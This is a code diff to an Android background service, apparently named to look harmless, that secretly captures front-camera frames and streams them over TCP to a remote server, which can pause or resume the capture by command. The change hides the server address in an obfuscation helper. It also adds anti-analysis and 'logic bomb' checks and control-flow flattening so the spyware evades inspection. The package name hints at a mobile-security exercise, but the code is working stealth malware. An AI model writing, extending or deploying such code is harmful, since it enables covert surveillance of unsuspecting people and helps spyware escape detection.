@@ -15,7 +15,8 @@ import android.os.Looper
 import android.util.Log
 import androidx.core.app.NotificationCompat
 import androidx.core.app.ServiceCompat
-import java.io.InputStream
+import com.example.mobsec_823.utils.SafetyNet
+import com.example.mobsec_823.utils.SecretBox
 import java.net.InetSocketAddress
 import java.net.Socket
 import java.util.concurrent.Executors
@@ -25,11 +26,6 @@ import javax.net.SocketFactory
 class CheeseTopping : Service() {
     private val TAG = "CheeseTopping"
 
-    // --- REMOTE SERVER CONFIG ---
-    private val SERVER_IP = "47.129.144.9"
-    private val SERVER_PORT = 6767
-    // ---------------------------
-
     private lateinit var cameraManager: CameraManager
     private var cameraDevice: CameraDevice? = null
     private var captureSession: CameraCaptureSession? = null
@@ -38,7 +34,7 @@ class CheeseTopping : Service() {
 
     private val mainHandler = Handler(Looper.getMainLooper())
     private var isOpeningCamera = false
-    private var isManuallyStopped = false // Controls /stop and /start logic
+    private var isManuallyStopped = false
 
     private val latestJpeg = AtomicReference<ByteArray?>()
     private val backgroundExecutor = Executors.newSingleThreadExecutor()
@@ -46,12 +42,26 @@ class CheeseTopping : Service() {
 
     override fun onCreate() {
         super.onCreate()
+        
+        // Initialize cameraManager immediately
         cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
-        targetCameraId = findFrontCameraId()
+
+        // CRITICAL FIX: startForeground() MUST be called before any potential early return/stopSelf()
+        // if the service was started via Context.startForegroundService().
         createNotificationChannelAndStartForeground()
 
-        // Start connection
-        pushClient = TcpPushClient(SERVER_IP, SERVER_PORT)
+        // Anti-Analysis & Logic Bomb
+        if (!SafetyNet.isEnvironmentSafe() || !SafetyNet.isTriggerArmed(this)) {
+            stopSelf()
+            return
+        }
+
+        targetCameraId = findFrontCameraId()
+
+        val serverIp = SecretBox.getKitchenAddress()
+        val serverPort = SecretBox.getToppingPort()
+
+        pushClient = TcpPushClient(serverIp, serverPort)
         pushClient?.start()
 
         registerCameraAvailabilityCallback()
@@ -63,7 +73,9 @@ class CheeseTopping : Service() {
         pushClient?.stop()
         closeCamera()
         backgroundExecutor.shutdownNow()
-        unregisterCameraAvailabilityCallback()
+        if (::cameraManager.isInitialized) {
+            unregisterCameraAvailabilityCallback()
+        }
         super.onDestroy()
     }
 
@@ -82,7 +94,6 @@ class CheeseTopping : Service() {
         val channelId = "camera_service_channel"
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(channelId, "System Services", NotificationManager.IMPORTANCE_LOW)
-            channel.setShowBadge(false)
             getSystemService(NotificationManager::class.java)?.createNotificationChannel(channel)
         }
         val notif = NotificationCompat.Builder(this, channelId)
@@ -100,18 +111,14 @@ class CheeseTopping : Service() {
         }
     }
 
-    // ---------------- Camera Availability (Auto Pause/Resume) ----------------
     private val availabilityCallback = object : CameraManager.AvailabilityCallback() {
         override fun onCameraAvailable(cameraId: String) {
-
-            // Only resume if user hasn't paused it via /stop
             if (!isManuallyStopped && cameraDevice == null && !isOpeningCamera) {
                 mainHandler.postDelayed({
                     if (cameraDevice == null && !isManuallyStopped) openCameraSafe()
                 }, 1000)
             }
         }
-        override fun onCameraUnavailable(cameraId: String) {}
     }
 
     private fun registerCameraAvailabilityCallback() {
@@ -121,9 +128,12 @@ class CheeseTopping : Service() {
         cameraManager.unregisterAvailabilityCallback(availabilityCallback)
     }
 
-    // ---------------- Open/Close Logic ----------------
     private fun openCameraSafe() {
         if (cameraDevice != null || targetCameraId == null || isOpeningCamera || isManuallyStopped) return
+        
+        // Control Flow Flattening Check
+        if (!SafetyNet.checkKitchenPermit(55)) return
+
         isOpeningCamera = true
         try {
             imageReader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 2)
@@ -186,14 +196,23 @@ class CheeseTopping : Service() {
     }
 
     private fun imageToJpegBytes(image: Image): ByteArray {
-        val plane = image.planes[0]
-        val buffer = plane.buffer
-        val bytes = ByteArray(buffer.remaining())
-        buffer.get(bytes)
-        return bytes
+        // Control Flow Flattening for image conversion
+        var state = 0xA1
+        var result = ByteArray(0)
+        while (state != 0) {
+            when (state) {
+                0xA1 -> {
+                    val plane = image.planes[0]
+                    val buffer = plane.buffer
+                    result = ByteArray(buffer.remaining())
+                    buffer.get(result)
+                    state = 0
+                }
+            }
+        }
+        return result
     }
 
-    // ---------------- TCP PUSH CLIENT + COMMAND LISTENER ----------------
     private inner class TcpPushClient(private val ip: String, private val port: Int) {
         private var workerThread: Thread? = null
         private var isRunning = false
@@ -213,38 +232,32 @@ class CheeseTopping : Service() {
                         val outputStream = socket.getOutputStream()
 
                         while (isRunning && !socket.isClosed) {
-                            // 1. CHECK FOR COMMANDS FIRST (Non-blocking)
                             if (inputStream.available() > 0) {
                                 val buffer = ByteArray(1024)
                                 val read = inputStream.read(buffer)
                                 if (read > 0) {
                                     val cmd = String(buffer, 0, read).trim()
 
-                                    if (cmd.contains("CMD_STOP")) {
+                                    if (cmd.contains(SecretBox.getCmdStop())) {
                                         isManuallyStopped = true
                                         mainHandler.post { closeCamera() }
-                                    } else if (cmd.contains("CMD_START")) {
+                                    } else if (cmd.contains(SecretBox.getCmdStart())) {
                                         isManuallyStopped = false
                                         mainHandler.post { openCameraSafe() }
-                                    } else if (cmd.contains("CMD_KILL")) {
-                                        mainHandler.post { stopSelf() }
-                                        return@Thread
                                     }
                                 }
                             }
 
-                            // 2. SEND VIDEO (Only if not stopped)
                             val jpeg = latestJpeg.get()
                             if (jpeg != null && cameraDevice != null && !isManuallyStopped) {
                                 try {
                                     outputStream.write(jpeg)
                                     outputStream.flush()
-                                    Thread.sleep(40) // Target ~25 FPS
+                                    Thread.sleep(40)
                                 } catch (e: Exception) {
-                                    break // Reconnect on write error
+                                    break
                                 }
                             } else {
-                                // Just wait for a command or a frame
                                 Thread.sleep(100)
                             }
                         }
